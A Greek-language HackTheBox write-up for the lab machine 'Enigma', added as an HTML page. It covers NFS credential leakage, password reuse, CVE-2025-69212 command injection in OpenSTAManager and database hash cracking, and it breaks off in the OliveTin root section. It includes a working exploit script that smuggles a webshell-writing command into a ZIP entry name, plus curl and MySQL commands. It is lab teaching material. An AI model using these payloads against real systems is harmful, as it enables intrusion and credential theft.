@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Enigma — S. Markakis</title>
+<meta name="description" content="HackTheBox Enigma — ένα anonymous export NFS διαρρέει credentials onboarding, επαναχρησιμοποίηση password σε webmail διαρρέει credentials CRM, ένα command injection P7M στο OpenSTAManager (CVE-2025-69212) φυτεύει ένα webshell, ένα σπασμένο hash DB δίνει έναν χρήστη, και ένα εργαλείο automation OliveTin που τρέχει σαν root εκτελεί ορίσματα ελεγχόμενα από τον επιτιθέμενο για root.">
+<meta property="og:title" content="HTB: Enigma — S. Markakis">
+<meta property="og:description" content="HackTheBox Enigma — ένα anonymous export NFS διαρρέει credentials onboarding, επαναχρησιμοποίηση password σε webmail διαρρέει credentials CRM, ένα command injection P7M στο OpenSTAManager (CVE-2025-69212) φυτεύει ένα webshell, ένα σπασμένο hash DB δίνει έναν χρήστη, και ένα εργαλείο automation OliveTin που τρέχει σαν root εκτελεί ορίσματα ελεγχόμενα από τον επιτιθέμενο για root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-enigma-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-enigma.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-enigma.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-enigma-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-enigma.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-enigma-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-enigma.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Enigma",
+  "description": "HackTheBox Enigma — ένα anonymous export NFS διαρρέει credentials onboarding, επαναχρησιμοποίηση password σε webmail διαρρέει credentials CRM, ένα command injection P7M στο OpenSTAManager (CVE-2025-69212) φυτεύει ένα webshell, ένα σπασμένο hash DB δίνει έναν χρήστη, και ένα εργαλείο automation OliveTin που τρέχει σαν root εκτελεί ορίσματα ελεγχόμενα από τον επιτιθέμενο για root.",
+  "datePublished": "2026-09-09",
+  "dateModified": "2026-09-09",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-enigma-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-enigma.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-enigma"
+  },
+  "timeRequired": "PT8M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-enigma.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Enigma</h1>
+    <div class="post-meta">
+      <span class="date">9 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Ευκολο</span>
+      <span>&nbsp;8 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Enigma είναι "εύκολο" μόνο στην ετικέτα δυσκολίας — είναι μια πραγματικά ικανοποιητική αλυσίδα όπου κάθε υπηρεσία παραδίδει το κλειδί για την επόμενη, και τίποτα στην πορεία δεν είναι bug memory-corruption. Ένα <strong>unauthenticated export NFS</strong> παραδίδει έγγραφα onboarding με ένα temp password· η <strong>επαναχρησιμοποίηση password</strong> το περπατά μέσα στο webmail ενός δεύτερου χρήστη, που διαρρέει credentials για ένα CRM· το CRM είναι ένα <strong>OpenSTAManager</strong> που είναι patched-αλλά-ακόμα-ευάλωτο (CVE-2025-69212) που μετατρέπει ένα upload ZIP σε webshell· ένα password βάσης δεδομένων μας δίνει έναν πραγματικό χρήστη· και το root είναι ένα λάθος ρυθμισμένο εργαλείο automation <strong>OliveTin</strong> που τρέχει ευχαρίστως εντολές επιπέδου-root — με ορίσματα δοσμένα από τον επιτιθέμενο — για όποιον μπορεί να φτάσει το socket του.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-enigma/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-enigma/img-attack-chain.png" alt="Enigma compromise chain: an anonymous NFS export leaks kevin's onboarding password, reuse gives sandra's webmail which leaks OpenSTAManager admin creds, CVE-2025-69212 drops a webshell as www-data, config.inc.php DB creds crack haris's hash for user.txt, and a root-run OliveTin backup_database action injects db_pass into a shell for root.txt" width="1568" height="591" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">NFS :2049</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">kevin (onboarding pdf)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">sandra (reuse)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">OpenSTAManager RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">www-data</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">DB hash → haris</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">OliveTin</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <p>Το scan είναι μια επιφάνεια σε σχήμα mail-server — SSH, HTTP, POP3/IMAP (Dovecot), και κρίσιμα <strong>NFS στη 2049</strong>. Τα πιστοποιητικά TLS και ένα redirect HTTP ονομάζουν τον host <code>enigma.htb</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -p- -sCV &lt;TARGET_IP&gt;</span>
+<span class="po">22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu
+80/tcp   open  http      nginx 1.24.0  (redirect → http://enigma.htb/)
+110/tcp  open  pop3      Dovecot pop3d
+143/tcp  open  imap      Dovecot imapd
+993/995  open  ssl/imap, ssl/pop3
+2049/tcp open  nfs       (RPC 100003 v3,4)</span></div>
+  </div>
+
+  <p>Ένα fuzz vhost στο <code>enigma.htb</code> αναδεικνύει το <strong>mail001</strong> (webmail Roundcube) και αργότερα το <strong>support_001</strong>. Πρόσθεσέ τα στο <code>/etc/hosts</code> και προχώρα στο export NFS.</p>
+
+  <!-- ══ NFS ══ -->
+  <h2>Αρχική Πρόσβαση — Διαρροή Anonymous NFS</h2>
+
+  <p>Το <code>showmount</code> λιστάρει ένα μόνο export με το χαρακτηριστικό <code>*</code> — <strong>κανένας περιορισμός client</strong>, οποιοσδήποτε μπορεί να το κάνει mount:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">showmount → mount</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">showmount -e &lt;TARGET_IP&gt;</span>
+<span class="po">Export list for &lt;TARGET_IP&gt;:
+/srv/nfs/onboarding *</span>
+<span class="pd">$ </span><span class="pc">sudo mount -t nfs &lt;TARGET_IP&gt;:/srv/nfs/onboarding /tmp/onboarding -o ro</span>
+<span class="pd">$ </span><span class="pc">ls -la /tmp/onboarding</span>
+<span class="po">-rw-r--r-- 1 root root 1751 Feb 19 14:53 New_Employee_Access.pdf</span></div>
+  </div>
+
+  <p>Ένα world-readable αρχείο, ονομασμένο ακριβώς όπως το είδος εγγράφων onboarding που έχει ένα temp password. Το <code>pdftotext</code> το επιβεβαιώνει:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">pdftotext New_Employee_Access.pdf -</span>
+    </div>
+    <div class="term-body"><span class="po">Enigma Corp IT Department — New Employee System Access
+Employee: Kevin Mitchell
+
+Webmail Access
+URL:      http://mail001.enigma.htb
+Username: </span><span class="pg">kevin</span><span class="po">
+Password: </span><span class="pg">Enigma2024!</span><span class="po">
+
+Please change your password upon first login.</span></div>
+  </div>
+
+  <div class="alert alert-warn">Ένα export NFS με <code>*</code> και χωρίς σκέψη <code>root_squash</code> είναι ολόκληρο το foothold. Τα exports θα έπρεπε να είναι καρφωμένα σε συγκεκριμένα hosts/subnets, mounted read-only όπου γίνεται, και — προφανώς — να μην χρησιμοποιούνται ποτέ για να σταθμεύσουν έγγραφα credentials.</div>
+
+  <!-- ══ REUSE ══ -->
+  <h2>Επαναχρησιμοποίηση Password — kevin → sandra</h2>
+
+  <p>Τα credentials του PDF κάνουν login στο Roundcube σαν kevin, του οποίου το inbox είναι ένα ανιαρό email καλωσορίσματος από τη <strong>Sarah στα Accounts</strong>. Αυτό είναι το στοιχείο: η Sarah έγινε onboarded με τον ίδιο τρόπο που έγινε ο Kevin, και το έγγραφο έλεγε στον <em>Kevin</em> να αλλάξει το temp password του — τίποτα δεν υποδεικνύει ότι κάποιος πραγματικά το έκανε. Η φτηνή υπόθεση είναι επαναχρησιμοποίηση password σε όλο το προσωπικό, και πληρώνει:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">sandra : Enigma2024!</span>
+    </div>
+    <div class="term-body"><span class="po">Login to http://mail001.enigma.htb as </span><span class="pg">sandra : Enigma2024!</span><span class="po">  → success</span></div>
+  </div>
+
+  <p>Το mailbox της Sandra έχει το κέρδος — ένα <strong>"Re: OpenSTAManager Access Request"</strong> από το IT με credentials για μια τρίτη εφαρμογή:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">sandra's inbox</span>
+    </div>
+    <div class="term-body"><span class="po">Re: OpenSTAManager Access Request
+
+URL:      http://support_001.enigma.htb
+Username: </span><span class="pg">admin</span><span class="po">
+Password: </span><span class="pg">Ne3s4rtars78s</span></div>
+  </div>
+
+  <div class="alert alert-info">Το Roundcube εδώ είναι 1.6.16 — η <em>patched</em> έκδοση, όχι μια ευάλωτη. Ο δρόμος μπροστά δεν ήταν ένα CVE webmail· ήταν το να διαβάσεις το mail. Η καταμέτρηση δεν αφορά μόνο εκδόσεις.</div>
+
+  <!-- ══ OSM RCE ══ -->
+  <h2>Foothold — Injection P7M του OpenSTAManager (CVE-2025-69212)</h2>
+
+  <p>Το <code>support_001</code> τρέχει <strong>OpenSTAManager 2.9.8</strong>, και τα credentials admin κάνουν login κατευθείαν. Εκείνη η έκδοση είναι ευάλωτη στο <strong>CVE-2025-69212</strong>, ένα OS command injection στην επεξεργασία αρχείων P7M (signed-XML). Ο μηχανισμός: όταν η εφαρμογή κάνει decode ένα αρχείο <code>.p7m</code> βγαίνει σε shell στο OpenSSL, παρεμβάλλοντας το <em>filename</em> στην εντολή χωρίς sanitisation:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">src/Util/XML.php — decodeP7M()</span>
+    </div>
+    <div class="term-body"><span class="po">$output_file = $directory.'/'.basename($file, '.p7m');
+</span><span class="pr">exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);</span></div>
+  </div>
+
+  <p>Το plugin <code>importFE_ZIP</code> κάνει extract ένα ανεβασμένο ZIP και τροφοδοτεί το όνομα κάθε καταχώρησης <code>.p7m</code> σε εκείνο το <code>exec()</code>. Οπότε ένα ZIP του οποίου το <em>όνομα καταχώρησης</em> κλείνει το εισαγωγικό και κάνει inject μια εντολή είναι αυθαίρετη εκτέλεση. Ένας περιορισμός: το <code>ZipArchive::extractTo()</code> της PHP χωρίζει στο <code>/</code>, οπότε το payload πρέπει να είναι χωρίς κάθετο — <code>cd files &amp;&amp; …</code> αντί για απόλυτο path:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">build the malicious zip</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 - &lt;&lt;'EOF'
+import zipfile
+cmd = 'cd files &amp;&amp; echo \'&lt;?php system($_GET["c"]); ?&gt;\' &gt; SHELL.php'
+fn  = f'invoice.p7m";{cmd};echo ".p7m'
+zipfile.ZipFile('exploit.zip','w').writestr(fn, b"DUMMY_P7M_CONTENT")
+EOF</span></div>
+  </div>
+
+  <p>Διαβάζοντας το filename ενάντια στην ευάλωτη γραμμή: το <code>invoice.p7m"</code> κλείνει το εισαγωγικό που τυλίγει το αθώο όνομα, το <code>;{cmd};</code> τρέχει το payload σαν δικό του statement, και το τελικό <code>echo ".p7m</code> απορροφά το υπόλοιπο <code>-inform DER …</code> σαν αθώα ορίσματα ώστε τίποτα να μη ρίξει syntax error. Ανέβασέ το μέσω του picker <strong>Importazione FE</strong> (ένα απλό <code>POST /actions.php</code>, <code>op=save</code>, πεδίο αρχείου <code>blob</code>):</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">upload &amp; confirm RCE</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -b osm.cookies -F op=save -F id_module=14 -F id_plugin=48 \
+     -F 'blob=@exploit.zip;type=application/zip' http://support_001.enigma.htb/actions.php</span>
+<span class="po">{"error":"... non è un file ZIP valido."}   </span><span class="pco"># fires AFTER exec() already ran</span>
+<span class="pd">$ </span><span class="pc">curl "http://support_001.enigma.htb/files/SHELL.php?c=id"</span>
+<span class="po">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+  </div>
+
+  <div class="alert alert-info">Εκείνο το error XML-parse είναι <em>επιβεβαίωση</em>, όχι αποτυχία — ο decoder πνίγεται στο <code>DUMMY_P7M_CONTENT</code> γιατί δεν είναι έγκυρο signed XML, αλλά εκείνος ο έλεγχος συμβαίνει μόνο αφού το injected filename μας έχει ήδη περάσει από <code>exec()</code>. Το webshell είναι στον δίσκο.</div>
+
+  <!-- ══ WWW-DATA → HARIS ══ -->
+  <h2>www-data → haris — Επαναχρησιμοποίηση Password Database</h2>
+
+  <p>Το <code>config.inc.php</code> του OpenSTAManager κρατά το login MySQL του, και το OSM αποθηκεύει τους δικούς του χρήστες σαν bcrypt στον πίνακα <code>zz_users</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">config → db → hashes</span>
+    </div>
+    <div class="term-body"><span class="pd">www-data$ </span><span class="pc">grep -E 'db_(username|password|name)' config.inc.php</span>
+<span class="po">$db_username = '</span><span class="pg">brollin</span><span class="po">';  $db_password = '</span><span class="pg">Fri3nds@9099</span><span class="po">';  $db_name = 'openstamanager';</span>
+<span class="pd">www-data$ </span><span class="pc">mysql -u brollin -p'Fri3nds@9099' openstamanager -N -e \
+     'SELECT username,password FROM zz_users;'</span>
+<span class="po">admin  $2y$10$rTJVUNyGGKPlhw2cFdf5Ae...
+</span><span class="pr">haris  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC</span></div>
+  </div>
+
+  <p>Ο haris είναι επίσης πραγματικός χρήστης συστήματος. Το bcrypt του πέφτει στο rockyou μέσα σε δευτερόλεπτα:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">hashcat -m 3200</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">hashcat -m 3200 haris.hash rockyou.txt</span>
+<span class="po">$2y$10$WHf1T79sxjsZongUKT2j...:</span><span class="pg">bestfriends</span></div>
+  </div>
+
+  <p>Το SSH είναι μόνο public-key, οπότε το <code>su haris</code> είναι ο τρόπος εισόδου. Το user flag ζει στο home του:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">su haris → user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">www-data$ </span><span class="pc">su haris        </span><span class="pco"># bestfriends</span>
+<span class="pu">haris</span><span class="ps">@</span><span class="ph">enigma</span><span class="ps">:~$ </span><span class="pc">cat user.txt</span><span class="po">
+</span><span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Root — Ένα Εργαλείο Automation Root που Εμπιστεύεται το Input του</h2>
+
+  <p>Ο haris δεν έχει sudo. Η καταμέτρηση διαδικασιών αναδεικνύει κάτι που τρέχει σαν root: <code>/usr/local/bin/OliveTin</code> — ένα web-based εργαλείο "run buttons for shell commands", ακούει στο <code>127.0.0.1:1337</code>. Το config του (<code>/etc/OliveTin/config.yaml</code>) έχει δύο ενοχοποιητικές ρυθμίσεις και μία επικίνδυνη action:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/OliveTin/config.yaml (excerpt)</span>
+    </div>
+    <div class="term-body"><span class="pr">authRequireGuestsToLogin: false</span><span class="po">     </span><span class="pco"># guests can do anything</span><span class="po">
+defaultPermissions: { exec: true }
+
+  - title: Backup Database
